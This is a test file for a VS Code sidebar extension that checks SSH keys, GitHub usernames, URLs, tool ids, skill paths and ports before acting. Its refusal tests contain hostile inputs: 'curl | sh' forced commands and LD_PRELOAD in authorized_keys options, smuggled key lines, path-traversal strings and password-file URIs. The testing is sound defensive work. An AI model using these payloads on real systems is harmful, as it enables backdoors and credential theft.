import { afterEach, beforeAll, beforeEach, describe, expect, mock, spyOn, test } from 'bun:test';
import * as fs from 'fs';
import * as os from 'os';
import { join } from 'path';
import type * as vscode from 'vscode';
import * as consoleClient from '../consoleClient';
import { __test__ as resourceMonitor, parseStatLine } from '../resource-monitor';
import type * as SidebarModule from '../sidebar-provider';
import type { SidebarProvider as Provider } from '../sidebar-provider';
import type { InstalledSkill, ResourceSnapshot, WorkspaceInfo } from '../shared-types';
import { TmuxControl } from '../tmux-control';

// bun cannot load the real vscode module; this is the surface the tested paths touch.
let warningChoice: string | undefined;
const vscodeWindow = {
  terminals: [] as unknown[],
  visibleTextEditors: [] as unknown[],
  createTerminal: mock((_options: unknown) => ({ show: (_preserveFocus?: boolean) => {} })),
  showErrorMessage: mock(async (_message: string) => undefined),
  showInformationMessage: mock(async (_message: string) => undefined),
  showWarningMessage: mock(async (..._args: unknown[]) => warningChoice),
  showTextDocument: mock(async (_document: unknown) => undefined),
};
const vscodeEnv = {
  clipboard: { writeText: mock(async (_text: string) => {}) },
  openExternal: mock(async (_uri: { scheme: string; value: string }) => true),
};
const vscodeWorkspace = {
  openTextDocument: mock(async (fileName: string) => ({ fileName })),
};
mock.module('vscode', () => ({
  window: vscodeWindow,
  env: vscodeEnv,
  workspace: vscodeWorkspace,
  ViewColumn: { Active: -1 },
  Uri: {
    joinPath: (...parts: unknown[]) => parts.join('/'),
    // Like VS Code's URI parser: the scheme is whatever precedes the first ':', and a
    // value without one is a file path.
    parse: (value: string) => ({ scheme: /^([^:/?#]+):/.exec(value)?.[1] ?? 'file', value }),
  },
}));

let SidebarProvider: typeof Provider;
let isAuthorizedKeyLine: typeof SidebarModule.isAuthorizedKeyLine;
let isGitHubUsername: typeof SidebarModule.isGitHubUsername;
beforeAll(async () => {
  ({ SidebarProvider, isAuthorizedKeyLine, isGitHubUsername } = await import('../sidebar-provider'));
});

const READS = ['_refreshTerminalsOnly', 'refresh', '_refreshResources', '_refreshInstalledSkills'] as const;
let provider: Provider;
let spies: Array<{ mockRestore(): void }> = [];
let posted: Array<{ command: string } & Record<string, unknown>> = [];
let html = '';

beforeEach(() => {
  // The reads are stubbed, but a new unstubbed one must still never find this
  // machine's real web password.
  consoleClient.__setContainerEnvDirForTests('/nonexistent/envhaven-container-environment');
  vscodeWindow.terminals = [];
  vscodeWindow.visibleTextEditors = [];
  vscodeWindow.createTerminal.mockClear();
  vscodeWindow.showErrorMessage.mockClear();
  vscodeWindow.showInformationMessage.mockClear();
  vscodeWindow.showWarningMessage.mockClear();
  vscodeWindow.showTextDocument.mockClear();
  vscodeEnv.clipboard.writeText.mockClear();
  vscodeEnv.openExternal.mockClear();
  vscodeWorkspace.openTextDocument.mockClear();
  warningChoice = undefined;
  posted = [];
  spies = [
    // The welcome branch unlinks a real marker under /config, and start() would
    // attach to this machine's tmux server; no test may do either.
    spyOn(fs, 'unlinkSync').mockImplementation(() => {}),
    spyOn(TmuxControl.prototype, 'start').mockResolvedValue(undefined),
  ];
  provider = new SidebarProvider({} as vscode.Uri);
});

afterEach(() => {
  provider.dispose();
  for (const spy of spies) spy.mockRestore();
});

/** Replace the four sidebar reads, which otherwise run tmux, /proc and the console. */
function stubReads(read: () => Promise<void>): void {
  const target = provider as unknown as Record<(typeof READS)[number], () => Promise<void>>;
  for (const name of READS) target[name] = read;
}

/** Resolve a fake view and return its message sender. What the host posts to the
 *  webview lands in `posted`, and the page it renders in `html`. */
function resolveView(visible: boolean): (message: unknown) => Promise<void> {
  let receive: (message: unknown) => Promise<void> = async () => {};
  const view = {
    visible,
    webview: {
      options: {},
      html: '',
      cspSource: '',
      asWebviewUri: (uri: unknown) => uri,
      postMessage: async (message: { command: string }) => {
        posted.push(message);
        return true;
      },
      onDidReceiveMessage: (listener: typeof receive) => {
        receive = listener;
      },
    },
    onDidChangeVisibility: () => {},
  };
  provider.resolveWebviewView(
    view as unknown as vscode.WebviewView,
    {} as vscode.WebviewViewResolveContext,
    {} as vscode.CancellationToken
  );
  html = view.webview.html;
  return (message) => receive(message);
}

/** What the host last showed the webview, which every later request is checked against. */
function hostState(): {
  _workspace?: WorkspaceInfo;
  _installedSkills: InstalledSkill[];
  _resources?: ResourceSnapshot;
} {
  return provider as unknown as ReturnType<typeof hostState>;
}

/** A refused request surfaces as an error toast; keep its console.error out of the output. */
function quietErrors(): void {
  spies.push(spyOn(console, 'error').mockImplementation(() => {}));
}

const WORKSPACE = {
  isManaged: true,
  sshCommand: 'ssh abc@ssh-abc.envhaven.app',
  havenCommand: 'haven connect . abc',
  aiTools: [
    { id: 'claude', name: 'Claude Code', envVars: ['ANTHROPIC_API_KEY'] },
    { id: 'codex', name: 'Codex', envVars: ['OPENAI_API_KEY'] },
  ],
} as unknown as WorkspaceInfo;

const DEPLOY_SKILL: InstalledSkill = {
  name: 'deploy',
  description: 'Ship it',
  source: 'envhaven/envhaven',
  path: '/config/.agents/skills/deploy',
  agents: ['claude'],
};

// Throwaway keys generated for these tests (ssh-keygen, OpenSSH 9.6).
const ED25519 =
  'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMT3XAXjjoOlDDNKEfU5RojpC4CV793Uf/u9wpkjuEYZ test@envhaven';
const ECDSA =
  'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNkjHW8rdTusinCOgVE6nBBIIR/05ClBdm4GZ8GStYblRqkmQB+Hx4fu7XaBrskqx0igQK2nHVqFmNH9OB44Fs4=';

/** A key blob in SSH wire form: the type name, length-prefixed, then key bytes. */
function blob(type: string): string {
  const name = Buffer.from(type);
  const length = Buffer.alloc(4);
  length.writeUInt32BE(name.length);
  return Buffer.concat([length, name, Buffer.alloc(32, 7)]).toString('base64');
}

function pollingStarted(): boolean {
  return (provider as unknown as { _pollingInterval?: unknown })._pollingInterval !== undefined;
}

describe('ready', () => {
  test('opens the welcome terminal and starts polling before the reads settle', async () => {
    let settle!: () => void;
    const reads = new Promise<void>((resolve) => {
      settle = resolve;
    });
    stubReads(() => reads);

    const handled = resolveView(true)({ command: 'ready' });

    expect(fs.unlinkSync).toHaveBeenCalledWith('/config/.envhaven-welcome-shown');
    expect(vscodeWindow.createTerminal).toHaveBeenCalledTimes(1);
    expect(pollingStarted()).toBe(true);
    settle();
    await handled;
  });

  test('does not poll while the view is hidden', async () => {
    stubReads(async () => {});
    await resolveView(false)({ command: 'ready' });
    expect(pollingStarted()).toBe(false);
  });

  test('reports a failed read without skipping the terminal or polling', async () => {
    spies.push(spyOn(console, 'error').mockImplementation(() => {}));
    stubReads(async () => {
      throw new Error('tmux gone');
    });
    await resolveView(true)({ command: 'ready' });
    expect(vscodeWindow.createTerminal).toHaveBeenCalledTimes(1);
    expect(pollingStarted()).toBe(true);
    expect(vscodeWindow.showErrorMessage).toHaveBeenCalledWith('Action failed: tmux gone');
  });
});

describe('signOutTool', () => {
  // A sign-out names a tool from the catalog the host last posted.
  beforeEach(() => {
    hostState()._workspace = {
      aiTools: [{ id: 'factory' }, { id: 'qwen' }],
    } as unknown as WorkspaceInfo;
  });

  function signOutRejects(status: number, instruction: string): void {
    spies.push(
      spyOn(consoleClient, 'signOutTool').mockRejectedValue(
        new consoleClient.ConsoleRequestError(instruction, status, instruction)
      )
    );
  }

  test('opens the terminal for a sign-out that stopped partway, then refreshes', async () => {
    const instruction =
      'The logout session opened, but managed credential cleanup did not finish. Finish the vendor logout, then retry sign-out.';
    const refresh = mock(async () => {});
    stubReads(refresh);
    signOutRejects(500, instruction);

    await resolveView(true)({ command: 'signOutTool', toolId: 'factory' });

    expect(vscodeWindow.createTerminal).toHaveBeenCalledTimes(1);
    expect(vscodeWindow.showErrorMessage).toHaveBeenCalledWith(`Failed to sign out: ${instruction}`);
    expect(refresh).toHaveBeenCalledTimes(1);
  });

  test('leaves the terminal closed for a conflict, then refreshes', async () => {
    const instruction = 'OPENAI_API_KEY is shared. Remove it from Environment.';
    const refresh = mock(async () => {});
    stubReads(refresh);
    signOutRejects(409, instruction);

    await resolveView(true)({ command: 'signOutTool', toolId: 'qwen' });

    expect(vscodeWindow.createTerminal).not.toHaveBeenCalled();
    expect(vscodeWindow.showErrorMessage).toHaveBeenCalledWith(`Failed to sign out: ${instruction}`);
    expect(refresh).toHaveBeenCalledTimes(1);
  });
});

describe('isAuthorizedKeyLine', () => {
  test('accepts one public key of each known type, with or without a comment', () => {
    expect(isAuthorizedKeyLine(ED25519)).toBe(true);
    expect(isAuthorizedKeyLine(ECDSA)).toBe(true);
    for (const type of [
      'ssh-ed25519',
      'ssh-rsa',
      'ecdsa-sha2-nistp256',
      'ecdsa-sha2-nistp384',
      'ecdsa-sha2-nistp521',
      'sk-ssh-ed25519@openssh.com',
      'sk-ecdsa-sha2-nistp256@openssh.com',
    ]) {
      expect(isAuthorizedKeyLine(`${type} ${blob(type)}`)).toBe(true);
      expect(isAuthorizedKeyLine(`${type} ${blob(type)} me@laptop (work)`)).toBe(true);
    }
  });

  test('refuses an options prefix, which turns a key into a forced command or a backdoor', () => {
    expect(isAuthorizedKeyLine(`command="curl https://x.test | sh" ${ED25519}`)).toBe(false);
    expect(isAuthorizedKeyLine(`environment="LD_PRELOAD=/tmp/x.so" ${ED25519}`)).toBe(false);
    expect(isAuthorizedKeyLine(`no-pty ${ED25519}`)).toBe(false);
  });

  test('refuses a second line smuggled in after the first', () => {
    expect(isAuthorizedKeyLine(`${ED25519}\ncommand="sh" ${ECDSA}`)).toBe(false);
    expect(isAuthorizedKeyLine(`${ED25519}\r\n`)).toBe(false);
    expect(isAuthorizedKeyLine(`${ED25519} note\x1b[2J`)).toBe(false);
  });

  test('refuses what only looks like a key', () => {
    expect(isAuthorizedKeyLine('')).toBe(false);
    expect(isAuthorizedKeyLine('ssh-ed25519')).toBe(false);
    expect(isAuthorizedKeyLine('ssh-ed25519 not-base64!')).toBe(false);
    expect(isAuthorizedKeyLine(`ssh-dss ${blob('ssh-dss')}`)).toBe(false);
    // The blob names its own type, and it has to be the one on the line.
    expect(isAuthorizedKeyLine(`ssh-ed25519 ${blob('ssh-rsa')}`)).toBe(false);
    expect(isAuthorizedKeyLine(`ssh-ed25519 ${blob('ssh-ed25519')} ${'x'.repeat(8192)}`)).toBe(false);
  });
});

describe('isGitHubUsername', () => {
  test('accepts GitHub logins', () => {
    for (const name of ['octocat', 'a', 'some-user', 'A1-b2', 'x'.repeat(39)]) {
      expect(isGitHubUsername(name)).toBe(true);
    }
  });

  test('refuses anything that could point the fetch somewhere else', () => {
    for (const name of ['', '-lead', '../../evil', 'a/b', 'x?y=1', 'x#y', 'a.b', 'a b', '%2e%2e', 'x'.repeat(40)]) {
      expect(isGitHubUsername(name)).toBe(false);
    }
  });
});

// The paste and GitHub paths both append to authorized_keys, so both refuse anything
// but plain public keys before a byte is written.
describe('authorized_keys writes', () => {
  let home = '';

  beforeEach(() => {
    home = fs.mkdtempSync(join(os.tmpdir(), 'envhaven-home-'));
    spies.push(spyOn(os, 'homedir').mockReturnValue(home));
    stubReads(async () => {});
  });

  afterEach(() => {
    fs.rmSync(home, { recursive: true, force: true });
  });

  const authorizedKeys = () => join(home, '.ssh', 'authorized_keys');

  test('appends a pasted public key only after native confirmation', async () => {
    warningChoice = 'Authorize Key';
    await resolveView(true)({ command: 'setSshKey', sshPublicKey: `  ${ED25519}\n` });
    expect(fs.readFileSync(authorizedKeys(), 'utf8')).toBe(`${ED25519}\n`);
    expect(posted).toContainEqual({ command: 'sshKeyResult', sshKeyOpSource: 'paste', success: true, error: undefined });
  });

  test('writes no pasted key when confirmation is declined', async () => {
    await resolveView(true)({ command: 'setSshKey', sshPublicKey: ED25519 });
    expect(fs.existsSync(authorizedKeys())).toBe(false);
    expect(vscodeWindow.showWarningMessage).toHaveBeenCalledWith(
      'Authorize this SSH key to log in to the workspace?',
      { modal: true, detail: expect.stringMatching(/^SHA256:/) },
      'Authorize Key'
    );
    expect(posted).toContainEqual({ command: 'sshKeyResult', sshKeyOpSource: 'paste', success: false, error: 'Cancelled' });
  });

  test('refuses a pasted key with an options prefix and writes nothing', async () => {
    await resolveView(true)({ command: 'setSshKey', sshPublicKey: `command="curl https://x.test | sh" ${ED25519}` });
    expect(fs.existsSync(authorizedKeys())).toBe(false);
    expect(posted).toContainEqual(
      expect.objectContaining({ command: 'sshKeyResult', sshKeyOpSource: 'paste', success: false })
    );
  });

  test('checks the GitHub username before building the URL, then keeps only real keys', async () => {
    const fetchSpy = spyOn(globalThis, 'fetch').mockResolvedValue(
      new Response([ED25519, `command="sh" ${ECDSA}`, 'not a key', `${ECDSA} `].join('\n'))
    );
    spies.push(fetchSpy);
    const send = resolveView(true);

    for (const username of ['../../evil', 'octocat/x.keys?', 'a b']) {
      await send({ command: 'importGitHubKeys', username });
    }
    expect(fetchSpy).not.toHaveBeenCalled();

    warningChoice = 'Authorize Keys';
    await send({ command: 'importGitHubKeys', username: 'octocat' });
    expect(String(fetchSpy.mock.calls[0][0])).toBe('https://github.com/octocat.keys');
    expect(fs.readFileSync(authorizedKeys(), 'utf8')).toBe(`${ED25519}\n${ECDSA}\n`);
  });

  test('fetches and validates GitHub keys but writes none when import is declined', async () => {
    const fetchSpy = spyOn(globalThis, 'fetch').mockResolvedValue(new Response(`${ED25519}\n`));
    spies.push(fetchSpy);
    await resolveView(true)({ command: 'importGitHubKeys', username: 'octocat' });

    expect(fetchSpy).toHaveBeenCalledTimes(1);
    expect(fs.existsSync(authorizedKeys())).toBe(false);
    expect(vscodeWindow.showWarningMessage).toHaveBeenCalledWith(
      'Authorize 1 SSH key from GitHub user @octocat?',
      { modal: true, detail: expect.stringMatching(/^SHA256:/) },
      'Authorize Keys'
    );
    expect(posted).toContainEqual({ command: 'sshKeyResult', sshKeyOpSource: 'github', success: false, error: 'Cancelled' });
  });
});

// The webview names the text and the host supplies it.
describe('copyToClipboard', () => {
  test('copies the command the host built for each key', async () => {
    stubReads(async () => {});
    hostState()._workspace = WORKSPACE;
    const send = resolveView(true);
    await send({ command: 'copyToClipboard', key: 'sshCommand' });
    await send({ command: 'copyToClipboard', key: 'havenCommand' });
    await send({ command: 'copyToClipboard', key: 'dockerPullCommand' });
    expect(vscodeEnv.clipboard.writeText.mock.calls.map(([text]) => text)).toEqual([
      'ssh abc@ssh-abc.envhaven.app',
      'haven connect . abc',
      'docker pull ghcr.io/envhaven/envhaven:latest',
    ]);
  });

  test('never copies text a message carries', async () => {
    quietErrors();
    stubReads(async () => {});
    hostState()._workspace = WORKSPACE;
    const send = resolveView(true);
    await send({ command: 'copyToClipboard', text: 'curl https://x.test | sh' });
    await send({ command: 'copyToClipboard', key: 'toString' });
    await send({ command: 'copySshCommand', text: 'curl https://x.test | sh' });
    expect(vscodeEnv.clipboard.writeText).not.toHaveBeenCalled();
  });
});

describe('openToolDocs', () => {
  test('opens https links and nothing else', async () => {
    quietErrors();
    stubReads(async () => {});
    const send = resolveView(true);
    for (const url of [
      'file:///run/s6/container_environment/PASSWORD',
      'command:workbench.action.terminal.new',
      'vscode://settings/security',
      'http://docs.example.test',
      '/etc/passwd',
    ]) {
      await send({ command: 'openToolDocs', url });
    }
    expect(vscodeEnv.openExternal).not.toHaveBeenCalled();

    await send({ command: 'openToolDocs', url: 'https://docs.anthropic.com' });
    expect(vscodeEnv.openExternal.mock.calls[0][0].value).toBe('https://docs.anthropic.com');
  });
});

// Tool ids reach the console's action API and, when that is down, its local binary.
describe('tool requests', () => {
  beforeEach(() => {
    quietErrors();
    stubReads(async () => {});
  });

  test('runs only a tool from the catalog the host posted', async () => {
    const launch = spyOn(consoleClient, 'launchTool').mockResolvedValue({ ok: true });
    spies.push(launch);
    const send = resolveView(true);

    await send({ command: 'runTool', toolId: 'claude', action: 'launch' });
    expect(launch).not.toHaveBeenCalled(); // no catalog posted yet

    hostState()._workspace = WORKSPACE;
    await send({ command: 'runTool', toolId: 'not-in-the-catalog', action: 'launch' });
    expect(launch).not.toHaveBeenCalled();
    expect(vscodeWindow.showErrorMessage).toHaveBeenCalledWith(
      'Action failed: Refused to run a tool this workspace did not list'
    );

    await send({ command: 'runTool', toolId: 'claude', action: 'launch' });
    expect(launch).toHaveBeenCalledWith('claude');
  });

  test('saves only a key the tool declares, and signs out only of a listed tool', async () => {
    const setKey = spyOn(consoleClient, 'setToolApiKey').mockResolvedValue();
    const signOut = spyOn(consoleClient, 'signOutTool').mockResolvedValue({ ok: true });
    spies.push(setKey, signOut);
    hostState()._workspace = WORKSPACE;
    const send = resolveView(true);

    await send({ command: 'setApiKey', toolId: 'claude', envVar: 'LD_PRELOAD', apiKey: 'x' });
    await send({ command: 'setApiKey', toolId: 'ghost', envVar: 'ANTHROPIC_API_KEY', apiKey: 'x' });
    await send({ command: 'signOutTool', toolId: 'ghost' });
    expect(setKey).not.toHaveBeenCalled();
    expect(signOut).not.toHaveBeenCalled();

    await send({ command: 'setApiKey', toolId: 'claude', envVar: 'ANTHROPIC_API_KEY', apiKey: 'sk-ant-1' });
    await send({ command: 'signOutTool', toolId: 'codex' });
    expect(setKey).toHaveBeenCalledWith('claude', 'ANTHROPIC_API_KEY', 'sk-ant-1');
    expect(signOut).toHaveBeenCalledWith('codex');
  });
});

// A skill install runs `skills add` for every connected agent.
describe('skill requests', () => {
  beforeEach(() => {
    quietErrors();
    stubReads(async () => {});
  });

  test('installs and previews only skills this sidebar was offered by search', async () => {
    const install = spyOn(consoleClient, 'installSkill').mockResolvedValue();
    const markdown = spyOn(consoleClient, 'fetchSkillMarkdown').mockResolvedValue({ markdown: '# x', frontmatter: {} });
    const search = spyOn(consoleClient, 'searchSkills').mockResolvedValue([
      { id: 'acme/skills/react', skillId: 'react', name: 'react', installs: 3, source: 'acme/skills' },
    ]);
    spies.push(install, markdown, search);
    const send = resolveView(true);

    await send({ command: 'installSkill', source: 'https://x.test/evil.git', skillId: 'evil' });
    await send({ command: 'fetchSkillMarkdown', source: 'acme/skills', skillId: 'react' });
    expect(install).not.toHaveBeenCalled();
    expect(markdown).not.toHaveBeenCalled();
    // The webview still hears back, so the button it disabled comes back.
    expect(posted).toContainEqual(
      expect.objectContaining({ command: 'skillInstallComplete', skillId: 'evil', success: false })
    );

    await send({ command: 'searchSkills', query: 'react' });
    await send({ command: 'fetchSkillMarkdown', source: 'acme/skills', skillId: 'react' });
    await send({ command: 'installSkill', source: 'acme/skills', skillId: 'react' });
    // Same characters, split differently: a different skill.
    await send({ command: 'installSkill', source: 'acme', skillId: 'skills/react' });
    expect(markdown).toHaveBeenCalledTimes(1);
    expect(install).toHaveBeenCalledTimes(1);
    expect(install).toHaveBeenCalledWith('acme/skills', 'react');

    // A reloaded webview has no results, so it is offered nothing until it searches again.
    await send({ command: 'ready' });
    await send({ command: 'installSkill', source: 'acme/skills', skillId: 'react' });
    expect(install).toHaveBeenCalledTimes(1);
  });

  test('opens SKILL.md only for an installed skill the host listed', async () => {
    hostState()._installedSkills = [DEPLOY_SKILL];
    const send = resolveView(true);

    await send({ command: 'openSkillInEditor', skillPath: '/run/s6/container_environment' });
    await send({ command: 'openSkillInEditor', skillPath: '/config/.agents/skills/deploy/../../../.ssh' });
    expect(vscodeWorkspace.openTextDocument).not.toHaveBeenCalled();

    await send({ command: 'openSkillInEditor', skillPath: '/config/.agents/skills/other/../deploy/' });
    expect(vscodeWorkspace.openTextDocument).toHaveBeenCalledWith('/config/.agents/skills/deploy/SKILL.md');
  });

  test('removes only an installed skill the host listed', async () => {
    const remove = spyOn(consoleClient, 'removeSkill').mockResolvedValue();
    spies.push(remove);
    hostState()._installedSkills = [DEPLOY_SKILL];
    const send = resolveView(true);

    await send({ command: 'removeSkill', skillName: 'ssh', skillPath: '/config/.ssh' });
    expect(remove).not.toHaveBeenCalled();
    expect(posted).toContainEqual(
      expect.objectContaining({ command: 'skillRemoveComplete', skillName: 'ssh', success: false })
    );

    await send({ command: 'removeSkill', skillName: 'deploy', skillPath: DEPLOY_SKILL.path });
    expect(remove).toHaveBeenCalledWith(DEPLOY_SKILL.path);
  });
});

describe('updatePreviewPort', () => {
  test('sends only an integer port in the platform range', async () => {
    stubReads(async () => {});
    const update = mock(async (_port: number) => {});
    (provider as unknown as { _updatePreviewPort: typeof update })._updatePreviewPort = update;
    const send = resolveView(true);

    const refused = [80, 1023, 65536, 3000.5, '3000', [3000], { port: 3000 }, null];
    for (const port of refused) {
      await send({ command: 'updatePreviewPort', port });
    }
    expect(update).not.toHaveBeenCalled();
    expect(posted.filter((m) => m.command === 'portUpdateError')).toHaveLength(refused.length);

    warningChoice = 'Expose Port';
    await send({ command: 'updatePreviewPort', port: 3000 });
    expect(update).toHaveBeenCalledWith(3000);
  });

  test('makes no platform request when public exposure is declined', async () => {
    stubReads(async () => {});
    const fetchSpy = spyOn(globalThis, 'fetch').mockResolvedValue(new Response('{}'));
    spies.push(fetchSpy);
    const names = ['_ENVHAVEN_WORKSPACE_ID', '_ENVHAVEN_WORKSPACE_TOKEN', '_ENVHAVEN_API_URL'] as const;
    const original = new Map(names.map((name) => [name, process.env[name]]));
    try {
      process.env._ENVHAVEN_WORKSPACE_ID = 'ws-1';
      process.env._ENVHAVEN_WORKSPACE_TOKEN = 'token';
      process.env._ENVHAVEN_API_URL = 'https://api.test';
      await resolveView(true)({ command: 'updatePreviewPort', port: 3000 });
      expect(fetchSpy).not.toHaveBeenCalled();
      expect(posted).toContainEqual({ command: 'portUpdateError', error: 'Cancelled' });
    } finally {
      for (const [name, value] of original) {
        if (value === undefined) delete process.env[name];
        else process.env[name] = value;
      }
    }
  });
});

describe('killProcess', () => {
  afterEach(() => {
    resourceMonitor.reset();
  });

  test('asks first, naming the process from the host snapshot, and stops only on yes', async () => {
    stubReads(async () => {});
    const child = Bun.spawn(['sleep', '30']);
    try {
      const { starttime } = parseStatLine(fs.readFileSync(`/proc/${child.pid}/stat`, 'utf8'))!;
      resourceMonitor.setLastSnapshot([[child.pid, starttime]]);
      hostState()._resources = {
        processes: [
          { pid: child.pid, ppid: 1, starttime, name: 'sleep', cmd: 'sleep 30', cpuPct: 0, memMb: 1, category: 'user' },
        ],
      } as ResourceSnapshot;
      const send = resolveView(true);

      await send({ command: 'killProcess', pid: child.pid, starttime });
      expect(vscodeWindow.showWarningMessage).toHaveBeenCalledWith(
        `Terminate sleep (PID ${child.pid})?`,
        { modal: true, detail: 'sleep 30' },
        'Terminate'
      );
      expect(child.exitCode).toBeNull();
      expect(child.signalCode).toBeNull();

      warningChoice = 'Terminate';
      await send({ command: 'killProcess', pid: child.pid, starttime });
      await child.exited;
      expect(child.signalCode).toBe('SIGTERM');
    } finally {
      child.kill('SIGKILL');
    }
  });

  test('refuses a process the host never listed, without asking', async () => {
    stubReads(async () => {});
    hostState()._resources = { processes: [] } as unknown as ResourceSnapshot;
    await resolveView(true)({ command: 'killProcess', pid: process.pid, starttime: 1 });
    expect(vscodeWindow.showWarningMessage).toHaveBeenCalledWith(
      `Cannot terminate PID ${process.pid}: not in current view`
    );
  });
});

describe('webview HTML', () => {
  const savedPublicUrl = process.env._ENVHAVEN_PUBLIC_URL;

  afterEach(() => {
    if (savedPublicUrl === undefined) delete process.env._ENVHAVEN_PUBLIC_URL;
    else process.env._ENVHAVEN_PUBLIC_URL = savedPublicUrl;
  });

  const nonceOf = (page: string) => /'nonce-([^']+)'/.exec(page)?.[1];

  test('frames only the exact preview origin, behind an unpredictable nonce', () => {
    process.env._ENVHAVEN_PUBLIC_URL = 'https://abc.envhaven.app';
    resolveView(true);
    const first = html;
    resolveView(true);

    expect(first).toContain('frame-src https://preview-abc.envhaven.app;');
    expect(first).not.toContain('*.envhaven.app');
    const nonce = nonceOf(first);
    expect(nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(first).toContain(`<script nonce="${nonce}"`);
    expect(nonceOf(html)).not.toBe(nonce);
  });

  test('frames nothing without a managed preview', () => {
    delete process.env._ENVHAVEN_PUBLIC_URL;
    resolveView(true);
    expect(html).toContain("frame-src 'none';");
  });
});
